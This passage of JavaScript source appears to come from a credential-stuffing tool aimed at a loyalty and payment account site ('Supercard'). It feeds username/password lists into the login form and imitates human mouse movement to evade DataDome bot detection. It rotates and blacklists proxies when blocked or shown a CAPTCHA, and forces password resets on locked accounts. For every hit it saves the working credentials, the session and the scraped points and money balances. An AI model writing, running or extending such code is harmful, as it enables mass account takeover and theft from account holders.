        logger.debug('[MOUSE]', `Performing mouse movements during form interaction`);
        await mouseMovementDuringFormFill(page).catch(e => 
          logger.debug('[MOUSE]', `Mouse movement error: ${e.message}`)
        );

        logger.debug('[SUBMIT]', `Submitting login`);

        const submitResult = await findAndClickSubmitButton(page);
        if (!submitResult.success) {
          logger.error('[SUBMIT]', `Failed to submit form`);
          logger.logFailed(username, password, 'submit_failed', submitResult.details);
          
          // Add to retry queue
          addToRetryQueue({ username, password }, 'submit_failed');
          
          processedCount++;
          continue;
        }

        logger.info('[SUBMIT]', `Form submitted via ${submitResult.method}`);

        // Random mouse movement AFTER form submission
        logger.debug('[MOUSE]', `Performing mouse movements after form submission`);
        await mouseMovementAfterSubmit(page).catch(e => 
          logger.debug('[MOUSE]', `Mouse movement error: ${e.message}`)
        );

        try {
          await Promise.race([
            page.waitForNavigation && page.waitForNavigation({ timeout: 5000 }).catch(() => {}),
            sleep(500)
          ]);
        } catch (_) {}

        // ⭐ ============ REFINED CAS DETECTION WITH TGC PRIORITY ============

        logger.debug('[AUTH]', `Detecting CAS authentication`);
        const casStartTime = Date.now();
        
        // Get adaptive timeout value
        const timeoutMs = (adaptiveTimeoutConfig.enabled !== false) 
          ? adaptiveTimeout.getTimeout()
          : config.detection.cas.timeout;
        
        if (config.logging.logLevel === 'debug') {
          const stats = adaptiveTimeout.getStats();
          logger.debug('[TIMEOUT]', `Using optimized detection with timeout: ${timeoutMs}ms (samples: ${stats.samples})`);
        }
        
        const casFlowOptions = {
          casLoginPath: config.detection.cas.loginPath,
          accountHost: new URL(config.account.url).hostname,
          timeoutMs: timeoutMs,
          tgcCookieNames: ['TGC'],
          verbose: config.logging.logLevel === 'debug'
        };

        let casResult = await submitAndDetectCasFlow(page, username, password, casFlowOptions);

        // ⭐ First-credential retry: Supercard always rejects the very first login
        // attempt after page load due to incomplete DataDome fingerprinting. When
        // enabled, retry once so the real credential validity can be determined.
        const retryFirstReasons = config.login.retryFirstCredentialOnReasons || ['invalid_credentials', 'no_success_indicator', 'detection_timeout'];
        const maxFirstCredentialAttempts = config.login.retryFirstCredentialMaxAttempts || 2;
        if (
          i === 0 &&
          config.login.retryFirstCredential &&
          firstCredentialRetryCount < maxFirstCredentialAttempts - 1 &&
          !casResult.ok &&
          retryFirstReasons.includes(casResult.reason)
        ) {
          firstCredentialRetryCount++;
          logger.info('[AUTH]', `🔄 First credential retry: Retrying due to initial page load behavior (reason: ${casResult.reason})`);
          const retryNavResult = await navTo(page, config.login.url);
          if (retryNavResult.success) {
            await dismissAllBlockingDialogs(page);
            // Wait for DataDome to initialize
            await sleep(rnd(1000, 2000));
            const retryFillResult = await fillForm(page, {
              [config.login.usernameSelector]: username,
              [config.login.passwordSelector]: password
            });
            if (retryFillResult.success) {
              const retrySubmitResult = await findAndClickSubmitButton(page);
              if (retrySubmitResult.success) {
                logger.info('[SUBMIT]', `First credential retry submitted via ${retrySubmitResult.method}`);
                try {
                  await Promise.race([
                    page.waitForNavigation && page.waitForNavigation({ timeout: 5000 }).catch(() => {}),
                    sleep(500)
                  ]);
                } catch (_) {}
                casResult = await submitAndDetectCasFlow(page, username, password, casFlowOptions);
                logger.info('[AUTH]', `🔄 First credential retry result: ${casResult.ok ? 'SUCCESS' : (casResult.reason || 'failure')}`);
              } else {
                logger.warn('[AUTH]', `First credential retry submit failed: ${retrySubmitResult.details}`);
              }
            } else {
              logger.warn('[AUTH]', `First credential retry form fill failed`);
            }
          } else {
            logger.warn('[AUTH]', `First credential retry navigation failed: ${retryNavResult.error}`);
          }
        }

        const casDuration = Date.now() - casStartTime;
        
        // Record successful detection timing for adaptive timeout
        if (casResult.ok && adaptiveTimeoutConfig.enabled !== false) {
          adaptiveTimeout.recordSuccess(casDuration);
        }

        // Handle CAS detection result directly (blocked/captcha/timeout already embedded in result)
        const minConfidence = config.detection.minimumSuccessConfidence || 0.75;
        if (casResult.ok && casResult.confidence >= minConfidence) {
          // ✅ SUCCESS — fall through to success handling below
        } else if (casResult.type === 'account_locked' && casResult.reason === 'account_lock_unlockable') {
          // ACCOUNT LOCKED — attempt password reset unlock if enabled
          if (config.passwordReset && config.passwordReset.enabled) {
            logger.warn('[AUTH]', `🔒 Account locked for ${username} — attempting password reset unlock`);
            const unlockResult = await unlockAccountViaPasswordReset(page, username, config, logger);
            if (unlockResult.success) {
              logger.success('[UNLOCK]', `✅ Password reset requested for ${username} (${unlockResult.details})`);
            } else {
              logger.warn('[UNLOCK]', `❌ Password reset failed for ${username}: ${unlockResult.details}`);
            }
          } else {
            logger.warn('[AUTH]', `🔒 Account locked for ${username} — passwordReset disabled, treating as failed`);
            logger.logFailed(
              username,
              password,
              'account_locked_reset_disabled',
              casResult.details || `Account locked and password reset is disabled (reason: ${casResult.reason})`
            );
          }
          if (process.send) {
            process.send({
              type: 'credential_result',
              username: username,
              password: password,
              status: 'account_locked',
              reason: casResult.reason
            });
          }
          consecutiveBlocks = 0;
          await clearBrowserState(page, context);
          processedCount++;
          continue;
        } else if (casResult.type === 'failure' && casResult.reason === 'invalid_credentials') {
          // DEAD CREDENTIAL — wrong password. Skip, never retry.
          logger.warn('[AUTH]', `❌ Invalid credentials`);
          logger.logFailed(username, password, casResult.reason, casResult.details || `Error message: ${config.detection.invalidCredentialsPhrase}`);
          if (process.send) {
            process.send({
              type: 'credential_result',
              username: username,
              password: password,
              status: 'failed',
              reason: casResult.reason
            });
          }
          consecutiveBlocks = 0;
          // ✅ FIX: Clear browser state to remove error message from DOM
          await clearBrowserState(page, context);
          processedCount++;
          continue;
        } else if (casResult.type === 'blocked') {
          // PROXY BURNED — retire proxy, retry credential on a different one
          const retryReason = casResult.reason || 'proxy_blocked';
          // Map CAS result reason to configured blacklist TTL key
          let blacklistKey = 'rate_limited';
          if (casResult.reason === 'http_403') blacklistKey = 'ip_banned';
          else if (casResult.reason === 'http_429') blacklistKey = 'rate_limited';
          else if (casResult.reason === 'suspicious_behavior') blacklistKey = 'bot_check_triggered';
          logger.warn('[PROCESSING]', `Proxy block detected after login (${retryReason}), requesting controller respawn with new proxy`);
          logger.logBlocked(username, password, retryReason, batchNum);
          if (process.send) {
            process.send({
              type: 'block_detected',
              proxy: rawUpstream,
              blockType: 'blocked',
              reason: retryReason,
              timestamp: Date.now()
            });
          }
          addToRetryQueue({ username, password }, retryReason);
          if (rawUpstream) {
            addToBlacklist(rawUpstream, blacklistKey);
          }

          // Request controller respawn with a fresh proxy for remaining credentials
          // (mirrors the pre-input respawn path for consistency)
          if (process.send) {
            process.send({
              type: 'credential_result',
              username: username,
              password: password,
              status: 'blocked',
              reason: retryReason
            });
            await new Promise((res) => {
              process.send({
                type: 'respawn_with_new_proxy',
                remainingSlice: slice.slice(i + 1),
                reason: retryReason
              }, (err) => {
                if (err) logger.warn('[IPC]', `respawn_with_new_proxy send error (controller will recover via exit handler): ${err.message || err}`);
                res();
              });
            });
            await forceCleanup('post_submit_blocked_respawn').catch(() => {});
            process.exit(0);
          }

          // Fallback: no IPC (standalone mode) — handle proxy rotation internally
          consecutiveBlocks++;
          const blockBackoffDelay = getBackoffDelay();
          logger.info('[BACKOFF]', `Progressive backoff: ${blockBackoffDelay}ms (consecutive blocks: ${consecutiveBlocks})`);
          await sleep(blockBackoffDelay);
          try {
            const relaunch = await relaunchBrowserWithNewProxy(rawProxies);
            context = relaunch.context;
            page = relaunch.page;
            globalContext = context;
            await navTo(page, config.login.url);
            await dismissAllBlockingDialogs(page);
            processedCount++;
            continue;
          } catch (e) {
            logger.error('[RELAUNCH]', `Block relaunch failed: ${e.message}`);
            for (let j = i; j < slice.length; j++) {
              addToRetryQueue(slice[j], 'relaunch_failed');
            }
            await forceCleanup('relaunch_failed').catch(() => {});
            process.exit(0);
            return;
          }
        } else if (casResult.type === 'captcha') {
          // CAPTCHA — retire proxy, retry credential on a different one
          const retryReason = casResult.reason || 'bot_verification';
          logger.warn('[PROCESSING]', `CAPTCHA/bot check detected after login, requesting controller respawn with new proxy`);
          logger.logCaptcha(username, password, 'v2', batchNum);
          if (process.send) {
            process.send({
              type: 'block_detected',
              proxy: rawUpstream,
              blockType: 'captcha',
              reason: retryReason,
              timestamp: Date.now()
            });
          }
          addToRetryQueue({ username, password }, retryReason);
          if (rawUpstream) {
            addToBlacklist(rawUpstream, 'captcha_triggered');
          }

          // Request controller respawn with a fresh proxy for remaining credentials
          if (process.send) {
            process.send({
              type: 'credential_result',
              username: username,
              password: password,
              status: 'captcha',
              reason: retryReason
            });
            await new Promise((res) => {
              process.send({
                type: 'respawn_with_new_proxy',
                remainingSlice: slice.slice(i + 1),
                reason: retryReason
              }, (err) => {
                if (err) logger.warn('[IPC]', `respawn_with_new_proxy send error (controller will recover via exit handler): ${err.message || err}`);
                res();
              });
            });
            await forceCleanup('post_submit_captcha_respawn').catch(() => {});
            process.exit(0);
          }

          // Fallback: no IPC (standalone mode) — handle proxy rotation internally
          consecutiveBlocks++;
          const captchaBackoffDelay = getBackoffDelay();
          logger.info('[BACKOFF]', `Progressive backoff: ${captchaBackoffDelay}ms (consecutive blocks: ${consecutiveBlocks})`);
          await sleep(captchaBackoffDelay);
          try {
            const relaunch = await relaunchBrowserWithNewProxy(rawProxies);
            context = relaunch.context;
            page = relaunch.page;
            globalContext = context;
            await navTo(page, config.login.url);
            await dismissAllBlockingDialogs(page);
            processedCount++;
            continue;
          } catch (e) {
            logger.error('[RELAUNCH]', `Captcha relaunch failed: ${e.message}`);
            for (let j = i; j < slice.length; j++) {
              addToRetryQueue(slice[j], 'relaunch_failed');
            }
            await forceCleanup('relaunch_failed').catch(() => {});
            process.exit(0);
            return;
          }
        } else if (casResult.type === 'timeout') {
          // AMBIGUOUS — slow proxy or partial load, give credential another chance
          logger.warn('[AUTH]', `⏳ Timeout for ${username} — adding to retry queue`);
          addToRetryQueue({ username, password }, 'timeout_retry');
          // Clear browser state to prevent session leakage to next credential
          await clearBrowserState(page, context);
          processedCount++;
          continue;
        } else if (!casResult.ok) {
          // Other failure (low confidence or unknown)
          const confidence = casResult.confidence ? (casResult.confidence * 100).toFixed(0) + '%' : 'unknown';
          logger.warn('[AUTH]', `❌ Authentication failed (${casResult.reason || 'unknown'}) confidence: ${confidence}`);
          logger.logFailed(username, password, casResult.reason || 'unknown', casResult.details || `Method: ${casResult.method}`);
          processedCount++;
          continue;
        }

        // ✅ SUCCESS:  Only reached if ok=true and confidence >= minConfidence
        consecutiveBlocks = 0; // Reset backoff on success
        logger.success('[AUTH]', `✅ Authentication successful`);
        logger.info('[AUTH]', `   Method: ${casResult.method}`);
        logger.info('[AUTH]', `   Confidence: ${(casResult.confidence * 100).toFixed(0)}%`);
        logger.info('[AUTH]', `   Duration: ${casDuration}ms`);

        // ⚡ SOFORT LOGGEN - bevor Chrome crashen kann!
        logger.logSuccess(
          username,
          password,
          casResult.method,
          casResult.confidence,
          casDuration,
          null,  // pointsBalance - wird später aktualisiert falls verfügbar
          null   // moneyBalance - wird später aktualisiert falls verfügbar
        );
        await logger.flushBuffer('successful').catch(() => {});
        logger.info('[AUTH]', `💾 Success sofort auf Disk geschrieben für ${username}`);

        // ⚡ SOFORT credential_result an Controller senden — bevor Account-Navigation/Balance-Parsing,
        // damit der Erfolg in der History erfasst wird, auch wenn der Worker danach gekillt wird.
        if (process.send) {
          process.send({
            type: 'credential_result',
            username: username,
            password: password,
            status: 'success',
            method: casResult.method,
            confidence: casResult.confidence,
            pointsBalance: null,
            moneyBalance: null
          });
        }

        // ⭐ ============ SAVE SESSION AFTER SUCCESSFUL LOGIN ============
        if (sessionManager) {
          try {
            const sessionSaved = await sessionManager.saveSession(page, username);
            if (sessionSaved) {
              logger.success('[SESSION]', `✅ Session saved for ${username}`);
            } else {
              logger.warn('[SESSION]', `Failed to save session for ${username}`);
            }
          } catch (sessionError) {
            logger.warn('[SESSION]', `Error saving session: ${sessionError.message}`);
          }
        }

        // Navigate to account page
        const accountNav = await navTo(page, config.account.url);
        
        // Check for shutdown/page closed errors
        if (!accountNav.success && (accountNav.error === 'shutting_down' || accountNav.error === 'page_closed')) {
          logger.warn('[PROCESSING]', 'Account navigation aborted due to shutdown');
          break;  // Exit the loop
        }

        // Initialize balance variables
        let pointsBalance = null;
        let moneyBalance = null;

        if (accountNav.success) {
          await sleep(200);
          
          // ⭐ Dismiss cookie consent popup if present
          await dismissAllBlockingDialogs(page);
          
          // ⭐ Parse account balances
          const balances = await parseAccountBalances(page);
          pointsBalance = balances.pointsBalance;
          moneyBalance = balances.moneyBalance;
          
          // Logout after successful account navigation
          try {
            logger.info('[LOGOUT]', `Attempting to logout for ${username}`);
            const logoutResult = await findAndClickLogoutButton(page, '[LOGOUT]');
            
            if (logoutResult.success) {
              logger.success('[LOGOUT]', `✅ Logout successful via ${logoutResult.method}`);
            } else {
              logger.warn('[LOGOUT]', `⚠️ Logout failed: ${logoutResult.details}`);
            }
          } catch (logoutError) {
            logger.warn('[LOGOUT]', `Logout error: ${logoutError?.message}`);
          }
        } else {
          logger.warn('[ACCOUNT]', `Account page navigation failed`);
          
          // Attempt logout even after failed account navigation
          try {
            logger.info('[LOGOUT]', `Attempting to logout for ${username} (after failed nav)`);
            const logoutResult = await findAndClickLogoutButton(page, '[LOGOUT]');
            
            if (logoutResult.success) {
              logger.success('[LOGOUT]', `✅ Logout successful via ${logoutResult.method}`);
            } else {
              logger.warn('[LOGOUT]', `⚠️ Logout failed: ${logoutResult.details}`);
            }
          } catch (logoutError) {
            logger.warn('[LOGOUT]', `Logout error: ${logoutError?.message}`);
          }

          if (accountNav.error === 'tunnel_failed') {
            logger.warn('[ACCOUNT]', `Tunnel error on account nav, relaunching`);
            try {
              const relaunch = await relaunchBrowserWithNewProxy(rawProxies);
              context = relaunch.context;
              page = relaunch.page;
              globalContext = context;
              await navTo(page, config.login.url);
              await dismissAllBlockingDialogs(page);
              continue;
            } catch (e) {
              logger.error('[RELAUNCH]', `Tunnel relaunch failed: ${e.message}`);
              for (let j = i; j < slice.length; j++) {
                addToRetryQueue(slice[j], 'relaunch_failed');
              }
              await forceCleanup('relaunch_failed').catch(() => {});
              if (process.send) {
                process.send({
                  status: 'ok',
                  processed: processedCount,
                  stats: logger.stats,
                  results: {
                    successful: logger.results.successful.length,
                    failed: logger.results.failed.length,
                    blocked: logger.results.blocked.length,
                    captcha: logger.results.captcha.length
                  }
                });
              }
              process.exit(0);
              return;
            }
          }
        }

        // Send updated credential_result with balance data if we managed to parse it.
        // This second send overwrites the initial entry in the controller's history,
        // enriching it with balance information. If the worker is killed before reaching
        // here, the initial credential_result (sent above) still ensures the success entry exists.
        if (process.send && (pointsBalance !== null || moneyBalance !== null)) {
          process.send({
            type: 'credential_result',
            username: username,
            password: password,
            status: 'success',
            method: casResult.method,
            confidence: casResult.confidence,
            pointsBalance: pointsBalance,
            moneyBalance: moneyBalance
          });
        }

        processedCount++;

      } catch (error) {
        if (shuttingDown) {
          logger.warn('[PROCESSING]', 'Operation interrupted by shutdown');
          break;
        }
        
        logger.error('[ERROR]', `Error processing ${username}:  ${error && error.message}`);
        logger.logError(username, password, error, `Batch ${batchNum}`);

        const MAX_ERROR_MSG_LENGTH = 50;
        const errorMsg = (error && error.message || 'unknown').substring(0, MAX_ERROR_MSG_LENGTH);

        // Recover credential to retry queue
        addToRetryQueue({ username, password }, `uncaught_error: ${errorMsg}`);

        // Tell the controller about the failure
        if (process.send) {
          process.send({
            type: 'credential_result',
            username: username,
            password: password,
            status: 'failed',
            reason: `uncaught_error: ${errorMsg}`
          });
        }

        processedCount++;
      }

      await sleep(rnd(config.form.pauseBetweenCredsMin, config.form.pauseBetweenCredsMax));
    }

    logger.info('[WORKER]', 'Batch processing complete');
    await sleep(rnd(config.batch.finishWaitMin, config.batch.finishWaitMax));

    await forceCleanup('batch_complete');
    logger.info('[WORKER]', 'Flushing logger buffers...');
    await logger.flushAllBuffers();

    logger.success('[WORKER]', `✅ Batch completed:  ${processedCount}/${slice.length} processed`);
    logger.debug('[STATS]', `Stats: `, logger.stats);

    if (process.send) {
      process.send({
        status: 'ok',
        processed: processedCount,
        stats: logger.stats,
        results: {
          successful: logger.results.successful.length,
          failed: logger.results.failed.length,
          blocked: logger.results.blocked.length,
          captcha: logger.results.captcha.length
        }
      });
    }


    process.exit(0);

  } catch (error) {
    logger.error('[FATAL]', `Fatal error: ${error && error.message}`);
    await forceCleanup('fatal_error').catch(() => {});
    if (process.send) process.send({ status: 'failed', reason: 'fatal_error', error: error && error.message });
    logger.cleanupSync();
    process.exit(1);
  }
})();
